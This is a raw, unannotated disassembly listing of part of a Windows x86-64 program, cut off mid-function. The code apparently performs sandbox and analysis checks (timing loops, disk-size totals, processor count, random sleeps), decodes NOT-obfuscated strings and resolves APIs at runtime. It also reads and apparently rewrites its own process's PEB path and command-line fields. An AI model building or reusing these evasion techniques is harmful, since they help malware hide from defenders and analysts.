  4017cc:	66 0f 2e f0          	ucomisd %xmm0,%xmm6
  4017d0:	77 8e                	ja     0x401760
  4017d2:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
  4017d7:	83 c6 01             	add    $0x1,%esi
  4017da:	ff d3                	call   *%rbx
  4017dc:	f2 48 0f 2a 4c 24 50 	cvtsi2sdq 0x50(%rsp),%xmm1
  4017e3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
  4017e8:	48 2b 44 24 60       	sub    0x60(%rsp),%rax
  4017ed:	48 8d 0d 50 b8 15 00 	lea    0x15b850(%rip),%rcx        # 0x55d044
  4017f4:	89 f2                	mov    %esi,%edx
  4017f6:	f2 48 0f 2a c0       	cvtsi2sd %rax,%xmm0
  4017fb:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  4017ff:	f2 0f 5e c1          	divsd  %xmm1,%xmm0
  401803:	66 0f 28 c8          	movapd %xmm0,%xmm1
  401807:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
  40180d:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  401812:	66 0f 28 d0          	movapd %xmm0,%xmm2
  401816:	f2 41 0f 5d c8       	minsd  %xmm8,%xmm1
  40181b:	f2 44 0f 58 d0       	addsd  %xmm0,%xmm10
  401820:	66 44 0f 28 c1       	movapd %xmm1,%xmm8
  401825:	66 0f 28 c8          	movapd %xmm0,%xmm1
  401829:	f2 41 0f 5f c9       	maxsd  %xmm9,%xmm1
  40182e:	66 44 0f 28 c9       	movapd %xmm1,%xmm9
  401833:	e8 e0 90 00 00       	call   0x40a918
  401838:	83 fe 0a             	cmp    $0xa,%esi
  40183b:	0f 85 fe fe ff ff    	jne    0x40173f
  401841:	f2 44 0f 5e 15 e6 bc 	divsd  0x15bce6(%rip),%xmm10        # 0x55d530
  401848:	15 00 
  40184a:	66 41 0f 28 d0       	movapd %xmm8,%xmm2
  40184f:	66 41 0f 28 d9       	movapd %xmm9,%xmm3
  401854:	48 8d 0d 05 b8 15 00 	lea    0x15b805(%rip),%rcx        # 0x55d060
  40185b:	f2 0f 10 05 dd bc 15 	movsd  0x15bcdd(%rip),%xmm0        # 0x55d540
  401862:	00 
  401863:	66 41 0f 28 fa       	movapd %xmm10,%xmm7
  401868:	66 41 0f 28 ca       	movapd %xmm10,%xmm1
  40186d:	f2 0f 5c fe          	subsd  %xmm6,%xmm7
  401871:	66 0f 54 f8          	andpd  %xmm0,%xmm7
  401875:	f2 0f 10 05 d3 bc 15 	movsd  0x15bcd3(%rip),%xmm0        # 0x55d550
  40187c:	00 
  40187d:	f2 0f 5e fe          	divsd  %xmm6,%xmm7
  401881:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  401885:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
  40188b:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
  401890:	f2 44 0f 11 4c 24 38 	movsd  %xmm9,0x38(%rsp)
  401897:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
  40189c:	f2 44 0f 11 44 24 38 	movsd  %xmm8,0x38(%rsp)
  4018a3:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  4018a8:	f2 44 0f 11 54 24 38 	movsd  %xmm10,0x38(%rsp)
  4018af:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  4018b4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
  4018b9:	e8 5a 90 00 00       	call   0x40a918
  4018be:	66 0f 2e 3d 92 bc 15 	ucomisd 0x15bc92(%rip),%xmm7        # 0x55d558
  4018c5:	00 
  4018c6:	dd 05 94 bc 15 00    	fldl   0x15bc94(%rip)        # 0x55d560
  4018cc:	dd 5c 24 38          	fstpl  0x38(%rsp)
  4018d0:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  4018d6:	73 5a                	jae    0x401932
  4018d8:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  4018dd:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
  4018e2:	48 8d 0d 1f b8 15 00 	lea    0x15b81f(%rip),%rcx        # 0x55d108
  4018e9:	f2 0f 10 4c 24 38    	movsd  0x38(%rsp),%xmm1
  4018ef:	48 89 da             	mov    %rbx,%rdx
  4018f2:	e8 21 90 00 00       	call   0x40a918
  4018f7:	b8 01 00 00 00       	mov    $0x1,%eax
  4018fc:	0f 28 b4 24 b0 00 00 	movaps 0xb0(%rsp),%xmm6
  401903:	00 
  401904:	0f 28 bc 24 c0 00 00 	movaps 0xc0(%rsp),%xmm7
  40190b:	00 
  40190c:	44 0f 28 84 24 d0 00 	movaps 0xd0(%rsp),%xmm8
  401913:	00 00 
  401915:	44 0f 28 8c 24 e0 00 	movaps 0xe0(%rsp),%xmm9
  40191c:	00 00 
  40191e:	44 0f 28 94 24 f0 00 	movaps 0xf0(%rsp),%xmm10
  401925:	00 00 
  401927:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
  40192e:	5b                   	pop    %rbx
  40192f:	5e                   	pop    %rsi
  401930:	5f                   	pop    %rdi
  401931:	c3                   	ret
  401932:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  401937:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
  40193c:	48 8d 0d 55 b7 15 00 	lea    0x15b755(%rip),%rcx        # 0x55d098
  401943:	f2 0f 10 4c 24 38    	movsd  0x38(%rsp),%xmm1
  401949:	48 89 da             	mov    %rbx,%rdx
  40194c:	e8 c7 8f 00 00       	call   0x40a918
  401951:	31 c0                	xor    %eax,%eax
  401953:	eb a7                	jmp    0x4018fc
  401955:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  40195c:	00 00 00 00 
  401960:	55                   	push   %rbp
  401961:	57                   	push   %rdi
  401962:	56                   	push   %rsi
  401963:	53                   	push   %rbx
  401964:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
  40196b:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
  401972:	00 
  401973:	0f 29 bc 24 90 00 00 	movaps %xmm7,0x90(%rsp)
  40197a:	00 
  40197b:	31 c9                	xor    %ecx,%ecx
  40197d:	bb 41 00 00 00       	mov    $0x41,%ebx
  401982:	be 01 00 00 00       	mov    $0x1,%esi
  401987:	ff 15 6f 0d 16 00    	call   *0x160d6f(%rip)        # 0x5626fc
  40198d:	89 c1                	mov    %eax,%ecx
  40198f:	66 0f 57 f6          	xorpd  %xmm6,%xmm6
  401993:	e8 88 8f 00 00       	call   0x40a920
  401998:	48 8d 0d c9 b7 15 00 	lea    0x15b7c9(%rip),%rcx        # 0x55d168
  40199f:	e8 6c 8f 00 00       	call   0x40a910
  4019a4:	ff 15 ca 0b 16 00    	call   *0x160bca(%rip)        # 0x562574
  4019aa:	c7 44 24 30 41 3a 5c 	movl   $0x5c3a41,0x30(%rsp)
  4019b1:	00 
  4019b2:	89 c7                	mov    %eax,%edi
  4019b4:	48 8b 2d a1 0b 16 00 	mov    0x160ba1(%rip),%rbp        # 0x56255c
  4019bb:	f2 0f 10 3d a5 bb 15 	movsd  0x15bba5(%rip),%xmm7        # 0x55d568
  4019c2:	00 
  4019c3:	eb 08                	jmp    0x4019cd
  4019c5:	83 c3 01             	add    $0x1,%ebx
  4019c8:	83 fb 5b             	cmp    $0x5b,%ebx
  4019cb:	74 64                	je     0x401a31
  4019cd:	8d 4b bf             	lea    -0x41(%rbx),%ecx
  4019d0:	89 f0                	mov    %esi,%eax
  4019d2:	d3 e0                	shl    %cl,%eax
  4019d4:	85 f8                	test   %edi,%eax
  4019d6:	74 ed                	je     0x4019c5
  4019d8:	45 31 c9             	xor    %r9d,%r9d
  4019db:	31 d2                	xor    %edx,%edx
  4019dd:	88 5c 24 30          	mov    %bl,0x30(%rsp)
  4019e1:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
  4019e6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  4019eb:	ff d5                	call   *%rbp
  4019ed:	85 c0                	test   %eax,%eax
  4019ef:	74 d4                	je     0x4019c5
  4019f1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  4019f6:	48 85 c0             	test   %rax,%rax
  4019f9:	0f 88 e1 00 00 00    	js     0x401ae0
  4019ff:	f2 48 0f 2a c0       	cvtsi2sd %rax,%xmm0
  401a04:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  401a08:	48 8d 0d 83 b7 15 00 	lea    0x15b783(%rip),%rcx        # 0x55d192
  401a0f:	89 da                	mov    %ebx,%edx
  401a11:	83 c3 01             	add    $0x1,%ebx
  401a14:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  401a1a:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  401a1f:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  401a23:	66 0f 28 d0          	movapd %xmm0,%xmm2
  401a27:	e8 ec 8e 00 00       	call   0x40a918
  401a2c:	83 fb 5b             	cmp    $0x5b,%ebx
  401a2f:	75 9c                	jne    0x4019cd
  401a31:	f2 0f 11 74 24 28    	movsd  %xmm6,0x28(%rsp)
  401a37:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  401a3c:	48 8d 0d 62 b7 15 00 	lea    0x15b762(%rip),%rcx        # 0x55d1a5
  401a43:	66 0f 28 ce          	movapd %xmm6,%xmm1
  401a47:	e8 cc 8e 00 00       	call   0x40a918
  401a4c:	f2 0f 10 05 1c bb 15 	movsd  0x15bb1c(%rip),%xmm0        # 0x55d570
  401a53:	00 
  401a54:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
  401a58:	0f 87 a2 00 00 00    	ja     0x401b00
  401a5e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  401a63:	ff 15 33 0b 16 00    	call   *0x160b33(%rip)        # 0x56259c
  401a69:	8b 5c 24 70          	mov    0x70(%rsp),%ebx
  401a6d:	48 8d 0d 87 b7 15 00 	lea    0x15b787(%rip),%rcx        # 0x55d1fb
  401a74:	89 da                	mov    %ebx,%edx
  401a76:	e8 9d 8e 00 00       	call   0x40a918
  401a7b:	83 fb 01             	cmp    $0x1,%ebx
  401a7e:	0f 86 9b 00 00 00    	jbe    0x401b1f
  401a84:	e8 9f 8e 00 00       	call   0x40a928
  401a89:	ba 1f 85 eb 51       	mov    $0x51eb851f,%edx
  401a8e:	89 c1                	mov    %eax,%ecx
  401a90:	f7 ea                	imul   %edx
  401a92:	89 c8                	mov    %ecx,%eax
  401a94:	c1 f8 1f             	sar    $0x1f,%eax
  401a97:	c1 fa 05             	sar    $0x5,%edx
  401a9a:	29 c2                	sub    %eax,%edx
  401a9c:	b8 64 00 00 00       	mov    $0x64,%eax
  401aa1:	0f af d0             	imul   %eax,%edx
  401aa4:	29 d1                	sub    %edx,%ecx
  401aa6:	83 c1 32             	add    $0x32,%ecx
  401aa9:	ff 15 85 0b 16 00    	call   *0x160b85(%rip)        # 0x562634
  401aaf:	48 8d 0d 8a b7 15 00 	lea    0x15b78a(%rip),%rcx        # 0x55d240
  401ab6:	e8 55 8e 00 00       	call   0x40a910
  401abb:	b8 01 00 00 00       	mov    $0x1,%eax
  401ac0:	0f 28 b4 24 80 00 00 	movaps 0x80(%rsp),%xmm6
  401ac7:	00 
  401ac8:	0f 28 bc 24 90 00 00 	movaps 0x90(%rsp),%xmm7
  401acf:	00 
  401ad0:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
  401ad7:	5b                   	pop    %rbx
  401ad8:	5e                   	pop    %rsi
  401ad9:	5f                   	pop    %rdi
  401ada:	5d                   	pop    %rbp
  401adb:	c3                   	ret
  401adc:	0f 1f 40 00          	nopl   0x0(%rax)
  401ae0:	48 89 c2             	mov    %rax,%rdx
  401ae3:	83 e0 01             	and    $0x1,%eax
  401ae6:	48 d1 ea             	shr    $1,%rdx
  401ae9:	48 09 c2             	or     %rax,%rdx
  401aec:	f2 48 0f 2a c2       	cvtsi2sd %rdx,%xmm0
  401af1:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
  401af5:	e9 0a ff ff ff       	jmp    0x401a04
  401afa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401b00:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  401b06:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  401b0b:	48 8d 0d ae b6 15 00 	lea    0x15b6ae(%rip),%rcx        # 0x55d1c0
  401b12:	66 0f 28 c8          	movapd %xmm0,%xmm1
  401b16:	e8 fd 8d 00 00       	call   0x40a918
  401b1b:	31 c0                	xor    %eax,%eax
  401b1d:	eb a1                	jmp    0x401ac0
  401b1f:	48 8d 0d ea b6 15 00 	lea    0x15b6ea(%rip),%rcx        # 0x55d210
  401b26:	ba 01 00 00 00       	mov    $0x1,%edx
  401b2b:	e8 e8 8d 00 00       	call   0x40a918
  401b30:	31 c0                	xor    %eax,%eax
  401b32:	eb 8c                	jmp    0x401ac0
  401b34:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  401b3b:	00 00 00 00 00 
  401b40:	48 83 ec 28          	sub    $0x28,%rsp
  401b44:	48 8d 0d 25 b7 15 00 	lea    0x15b725(%rip),%rcx        # 0x55d270
  401b4b:	e8 c0 8d 00 00       	call   0x40a910
  401b50:	e8 6b fb ff ff       	call   0x4016c0
  401b55:	e8 06 fe ff ff       	call   0x401960
  401b5a:	85 c0                	test   %eax,%eax
  401b5c:	0f 95 c0             	setne  %al
  401b5f:	0f b6 c0             	movzbl %al,%eax
  401b62:	48 83 c4 28          	add    $0x28,%rsp
  401b66:	c3                   	ret
  401b67:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401b6e:	00 00 
  401b70:	41 57                	push   %r15
  401b72:	41 56                	push   %r14
  401b74:	41 55                	push   %r13
  401b76:	41 54                	push   %r12
  401b78:	55                   	push   %rbp
  401b79:	57                   	push   %rdi
  401b7a:	56                   	push   %rsi
  401b7b:	53                   	push   %rbx
  401b7c:	48 81 ec 18 07 00 00 	sub    $0x718,%rsp
  401b83:	4c 8d 05 f6 b8 15 00 	lea    0x15b8f6(%rip),%r8        # 0x55d480
  401b8a:	ba 9e ff ff ff       	mov    $0xffffff9e,%edx
  401b8f:	31 c0                	xor    %eax,%eax
  401b91:	f7 d2                	not    %edx
  401b93:	48 8d 0d e6 b8 15 00 	lea    0x15b8e6(%rip),%rcx        # 0x55d480
  401b9a:	88 94 04 a0 00 00 00 	mov    %dl,0xa0(%rsp,%rax,1)
  401ba1:	48 83 c0 01          	add    $0x1,%rax
  401ba5:	41 0f b6 14 00       	movzbl (%r8,%rax,1),%edx
  401baa:	84 d2                	test   %dl,%dl
  401bac:	75 e3                	jne    0x401b91
  401bae:	48 89 ca             	mov    %rcx,%rdx
  401bb1:	44 8b 02             	mov    (%rdx),%r8d
  401bb4:	48 83 c2 04          	add    $0x4,%rdx
  401bb8:	41 8d 80 ff fe fe fe 	lea    -0x1010101(%r8),%eax
  401bbf:	41 f7 d0             	not    %r8d
  401bc2:	44 21 c0             	and    %r8d,%eax
  401bc5:	25 80 80 80 80       	and    $0x80808080,%eax
  401bca:	74 e5                	je     0x401bb1
  401bcc:	41 89 c0             	mov    %eax,%r8d
  401bcf:	41 c1 e8 10          	shr    $0x10,%r8d
  401bd3:	a9 80 80 00 00       	test   $0x8080,%eax
  401bd8:	41 0f 44 c0          	cmove  %r8d,%eax
  401bdc:	4c 8d 42 02          	lea    0x2(%rdx),%r8
  401be0:	49 0f 44 d0          	cmove  %r8,%rdx
  401be4:	00 c0                	add    %al,%al
  401be6:	48 83 da 03          	sbb    $0x3,%rdx
  401bea:	48 29 ca             	sub    %rcx,%rdx
  401bed:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
  401bf4:	00 
  401bf5:	c6 84 14 a0 00 00 00 	movb   $0x0,0xa0(%rsp,%rdx,1)
  401bfc:	00 
  401bfd:	ff 15 81 09 16 00    	call   *0x160981(%rip)        # 0x562584
  401c03:	48 89 c5             	mov    %rax,%rbp
  401c06:	31 d2                	xor    %edx,%edx
  401c08:	b8 ad ff ff ff       	mov    $0xffffffad,%eax
  401c0d:	48 85 ed             	test   %rbp,%rbp
  401c10:	4c 8d 05 79 b8 15 00 	lea    0x15b879(%rip),%r8        # 0x55d490
  401c17:	0f 84 0c 04 00 00    	je     0x402029
  401c1d:	0f 1f 00             	nopl   (%rax)
  401c20:	f7 d0                	not    %eax
  401c22:	48 8d 0d 67 b8 15 00 	lea    0x15b867(%rip),%rcx        # 0x55d490
  401c29:	88 84 14 a0 00 00 00 	mov    %al,0xa0(%rsp,%rdx,1)
  401c30:	48 83 c2 01          	add    $0x1,%rdx
  401c34:	41 0f b6 04 10       	movzbl (%r8,%rdx,1),%eax
  401c39:	84 c0                	test   %al,%al
  401c3b:	75 e3                	jne    0x401c20
  401c3d:	48 89 ca             	mov    %rcx,%rdx
  401c40:	44 8b 02             	mov    (%rdx),%r8d
  401c43:	48 83 c2 04          	add    $0x4,%rdx
  401c47:	41 8d 80 ff fe fe fe 	lea    -0x1010101(%r8),%eax
  401c4e:	41 f7 d0             	not    %r8d
  401c51:	44 21 c0             	and    %r8d,%eax
  401c54:	25 80 80 80 80       	and    $0x80808080,%eax
  401c59:	74 e5                	je     0x401c40
  401c5b:	41 89 c0             	mov    %eax,%r8d
  401c5e:	4c 8b 25 27 09 16 00 	mov    0x160927(%rip),%r12        # 0x56258c
  401c65:	41 c1 e8 10          	shr    $0x10,%r8d
  401c69:	a9 80 80 00 00       	test   $0x8080,%eax
  401c6e:	41 0f 44 c0          	cmove  %r8d,%eax
  401c72:	4c 8d 42 02          	lea    0x2(%rdx),%r8
  401c76:	49 0f 44 d0          	cmove  %r8,%rdx
  401c7a:	00 c0                	add    %al,%al
  401c7c:	48 83 da 03          	sbb    $0x3,%rdx
  401c80:	48 29 ca             	sub    %rcx,%rdx
  401c83:	48 89 e9             	mov    %rbp,%rcx
  401c86:	c6 84 14 a0 00 00 00 	movb   $0x0,0xa0(%rsp,%rdx,1)
  401c8d:	00 
  401c8e:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
  401c95:	00 
  401c96:	41 ff d4             	call   *%r12
  401c99:	4c 8d 05 10 b8 15 00 	lea    0x15b810(%rip),%r8        # 0x55d4b0
  401ca0:	48 89 c6             	mov    %rax,%rsi
  401ca3:	31 d2                	xor    %edx,%edx
  401ca5:	b8 ad ff ff ff       	mov    $0xffffffad,%eax
  401caa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401cb0:	f7 d0                	not    %eax
  401cb2:	48 8d 0d f7 b7 15 00 	lea    0x15b7f7(%rip),%rcx        # 0x55d4b0
  401cb9:	88 84 14 a0 00 00 00 	mov    %al,0xa0(%rsp,%rdx,1)
  401cc0:	48 83 c2 01          	add    $0x1,%rdx
  401cc4:	41 0f b6 04 10       	movzbl (%r8,%rdx,1),%eax
  401cc9:	84 c0                	test   %al,%al
  401ccb:	75 e3                	jne    0x401cb0
  401ccd:	48 89 ca             	mov    %rcx,%rdx
  401cd0:	44 8b 02             	mov    (%rdx),%r8d
  401cd3:	48 83 c2 04          	add    $0x4,%rdx
  401cd7:	41 8d 80 ff fe fe fe 	lea    -0x1010101(%r8),%eax
  401cde:	41 f7 d0             	not    %r8d
  401ce1:	44 21 c0             	and    %r8d,%eax
  401ce4:	25 80 80 80 80       	and    $0x80808080,%eax
  401ce9:	74 e5                	je     0x401cd0
  401ceb:	41 89 c0             	mov    %eax,%r8d
  401cee:	41 c1 e8 10          	shr    $0x10,%r8d
  401cf2:	a9 80 80 00 00       	test   $0x8080,%eax
  401cf7:	41 0f 44 c0          	cmove  %r8d,%eax
  401cfb:	4c 8d 42 02          	lea    0x2(%rdx),%r8
  401cff:	49 0f 44 d0          	cmove  %r8,%rdx
  401d03:	00 c0                	add    %al,%al
  401d05:	48 83 da 03          	sbb    $0x3,%rdx
  401d09:	48 29 ca             	sub    %rcx,%rdx
  401d0c:	48 89 e9             	mov    %rbp,%rcx
  401d0f:	c6 84 14 a0 00 00 00 	movb   $0x0,0xa0(%rsp,%rdx,1)
  401d16:	00 
  401d17:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
  401d1e:	00 
  401d1f:	41 ff d4             	call   *%r12
  401d22:	4c 8d 05 a7 b7 15 00 	lea    0x15b7a7(%rip),%r8        # 0x55d4d0
  401d29:	48 89 c3             	mov    %rax,%rbx
  401d2c:	31 d2                	xor    %edx,%edx
  401d2e:	b8 ad ff ff ff       	mov    $0xffffffad,%eax
  401d33:	f7 d0                	not    %eax
  401d35:	48 8d 0d 94 b7 15 00 	lea    0x15b794(%rip),%rcx        # 0x55d4d0
  401d3c:	88 84 14 a0 00 00 00 	mov    %al,0xa0(%rsp,%rdx,1)
  401d43:	48 83 c2 01          	add    $0x1,%rdx
  401d47:	41 0f b6 04 10       	movzbl (%r8,%rdx,1),%eax
  401d4c:	84 c0                	test   %al,%al
  401d4e:	75 e3                	jne    0x401d33
  401d50:	48 89 ca             	mov    %rcx,%rdx
  401d53:	44 8b 02             	mov    (%rdx),%r8d
  401d56:	48 83 c2 04          	add    $0x4,%rdx
  401d5a:	41 8d 80 ff fe fe fe 	lea    -0x1010101(%r8),%eax
  401d61:	41 f7 d0             	not    %r8d
  401d64:	44 21 c0             	and    %r8d,%eax
  401d67:	25 80 80 80 80       	and    $0x80808080,%eax
  401d6c:	74 e5                	je     0x401d53
  401d6e:	41 89 c0             	mov    %eax,%r8d
  401d71:	41 c1 e8 10          	shr    $0x10,%r8d
  401d75:	a9 80 80 00 00       	test   $0x8080,%eax
  401d7a:	41 0f 44 c0          	cmove  %r8d,%eax
  401d7e:	4c 8d 42 02          	lea    0x2(%rdx),%r8
  401d82:	49 0f 44 d0          	cmove  %r8,%rdx
  401d86:	00 c0                	add    %al,%al
  401d88:	48 83 da 03          	sbb    $0x3,%rdx
  401d8c:	48 29 ca             	sub    %rcx,%rdx
  401d8f:	48 89 e9             	mov    %rbp,%rcx
  401d92:	c6 84 14 a0 00 00 00 	movb   $0x0,0xa0(%rsp,%rdx,1)
  401d99:	00 
  401d9a:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
  401da1:	00 
  401da2:	41 ff d4             	call   *%r12
  401da5:	4c 8d 05 44 b7 15 00 	lea    0x15b744(%rip),%r8        # 0x55d4f0
  401dac:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  401db1:	31 d2                	xor    %edx,%edx
  401db3:	b8 ad ff ff ff       	mov    $0xffffffad,%eax
  401db8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  401dbf:	00 
  401dc0:	f7 d0                	not    %eax
  401dc2:	48 8d 0d 27 b7 15 00 	lea    0x15b727(%rip),%rcx        # 0x55d4f0
  401dc9:	88 84 14 a0 00 00 00 	mov    %al,0xa0(%rsp,%rdx,1)
  401dd0:	48 83 c2 01          	add    $0x1,%rdx
  401dd4:	41 0f b6 04 10       	movzbl (%r8,%rdx,1),%eax
  401dd9:	84 c0                	test   %al,%al
  401ddb:	75 e3                	jne    0x401dc0
  401ddd:	48 89 ca             	mov    %rcx,%rdx
  401de0:	44 8b 02             	mov    (%rdx),%r8d
  401de3:	48 83 c2 04          	add    $0x4,%rdx
  401de7:	41 8d 80 ff fe fe fe 	lea    -0x1010101(%r8),%eax
  401dee:	41 f7 d0             	not    %r8d
  401df1:	44 21 c0             	and    %r8d,%eax
  401df4:	25 80 80 80 80       	and    $0x80808080,%eax
  401df9:	74 e5                	je     0x401de0
  401dfb:	41 89 c0             	mov    %eax,%r8d
  401dfe:	41 c1 e8 10          	shr    $0x10,%r8d
  401e02:	a9 80 80 00 00       	test   $0x8080,%eax
  401e07:	41 0f 44 c0          	cmove  %r8d,%eax
  401e0b:	4c 8d 42 02          	lea    0x2(%rdx),%r8
  401e0f:	49 0f 44 d0          	cmove  %r8,%rdx
  401e13:	00 c0                	add    %al,%al
  401e15:	48 83 da 03          	sbb    $0x3,%rdx
  401e19:	48 29 ca             	sub    %rcx,%rdx
  401e1c:	48 89 e9             	mov    %rbp,%rcx
  401e1f:	c6 84 14 a0 00 00 00 	movb   $0x0,0xa0(%rsp,%rdx,1)
  401e26:	00 
  401e27:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
  401e2e:	00 
  401e2f:	41 ff d4             	call   *%r12
  401e32:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  401e37:	ff 15 0f 07 16 00    	call   *0x16070f(%rip)        # 0x56254c
  401e3d:	31 d2                	xor    %edx,%edx
  401e3f:	41 89 c0             	mov    %eax,%r8d
  401e42:	b9 38 04 00 00       	mov    $0x438,%ecx
  401e47:	ff 15 9f 07 16 00    	call   *0x16079f(%rip)        # 0x5625ec
  401e4d:	48 85 c0             	test   %rax,%rax
  401e50:	48 89 c5             	mov    %rax,%rbp
  401e53:	0f 84 d0 01 00 00    	je     0x402029
  401e59:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
  401e5e:	31 d2                	xor    %edx,%edx
  401e60:	41 b9 30 00 00 00    	mov    $0x30,%r9d
  401e66:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  401e6b:	48 89 e9             	mov    %rbp,%rcx
  401e6e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401e73:	ff d6                	call   *%rsi
  401e75:	85 c0                	test   %eax,%eax
  401e77:	0f 85 a3 01 00 00    	jne    0x402020
  401e7d:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
  401e84:	00 00 
  401e86:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  401e8d:	00 00 
  401e8f:	41 b9 08 00 00 00    	mov    $0x8,%r9d
  401e95:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
  401e9a:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
  401e9f:	48 89 e9             	mov    %rbp,%rcx
  401ea2:	4c 8b 25 5b 07 16 00 	mov    0x16075b(%rip),%r12        # 0x562604
  401ea9:	41 ff d4             	call   *%r12
  401eac:	85 c0                	test   %eax,%eax
  401eae:	0f 84 6c 01 00 00    	je     0x402020
  401eb4:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  401eb9:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
  401ebe:	0f 84 5c 01 00 00    	je     0x402020
  401ec4:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
  401ec9:	0f 84 51 01 00 00    	je     0x402020
  401ecf:	ba 04 01 00 00       	mov    $0x104,%edx
  401ed4:	48 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%rcx
  401edb:	00 
  401edc:	ff 15 d2 06 16 00    	call   *0x1606d2(%rip)        # 0x5625b4
  401ee2:	b9 08 02 00 00       	mov    $0x208,%ecx
  401ee7:	e8 e4 89 00 00       	call   0x40a8d0
  401eec:	48 85 c0             	test   %rax,%rax
  401eef:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  401ef4:	0f 84 26 01 00 00    	je     0x402020
  401efa:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  401eff:	48 8b 48 38          	mov    0x38(%rax),%rcx
  401f03:	ff d3                	call   *%rbx
  401f05:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  401f0a:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401f0f:	48 8b 48 20          	mov    0x20(%rax),%rcx
  401f13:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401f18:	48 83 c1 60          	add    $0x60,%rcx
  401f1c:	ff d0                	call   *%rax
  401f1e:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  401f23:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401f28:	48 8b 48 20          	mov    0x20(%rax),%rcx
  401f2c:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401f31:	48 83 c1 70          	add    $0x70,%rcx
  401f35:	ff d0                	call   *%rax
  401f37:	48 8d 94 24 f0 02 00 	lea    0x2f0(%rsp),%rdx
  401f3e:	00 
  401f3f:	31 c9                	xor    %ecx,%ecx
  401f41:	41 b8 04 01 00 00    	mov    $0x104,%r8d
  401f47:	ff 15 2f 06 16 00    	call   *0x16062f(%rip)        # 0x56257c
  401f4d:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  401f52:	48 8b 50 18          	mov    0x18(%rax),%rdx
  401f56:	4c 8b 7a 10          	mov    0x10(%rdx),%r15
  401f5a:	4c 8d 6a 10          	lea    0x10(%rdx),%r13
  401f5e:	4d 39 fd             	cmp    %r15,%r13
  401f61:	0f 84 93 00 00 00    	je     0x401ffa
  401f67:	48 8d 9c 24 00 05 00 	lea    0x500(%rsp),%rbx
  401f6e:	00 
  401f6f:	45 31 f6             	xor    %r14d,%r14d
  401f72:	48 89 de             	mov    %rbx,%rsi
  401f75:	eb 15                	jmp    0x401f8c
  401f77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401f7e:	00 00 
  401f80:	4d 8b 3f             	mov    (%r15),%r15
  401f83:	4d 39 fd             	cmp    %r15,%r13
  401f86:	0f 84 b4 00 00 00    	je     0x402040
  401f8c:	48 89 df             	mov    %rbx,%rdi
  401f8f:	4c 89 f0             	mov    %r14,%rax
  401f92:	b9 41 00 00 00       	mov    $0x41,%ecx
  401f97:	f3 48 ab             	rep stos %rax,(%rdi)
  401f9a:	49 8b 57 50          	mov    0x50(%r15),%rdx
  401f9e:	49 89 f0             	mov    %rsi,%r8
  401fa1:	48 89 e9             	mov    %rbp,%rcx
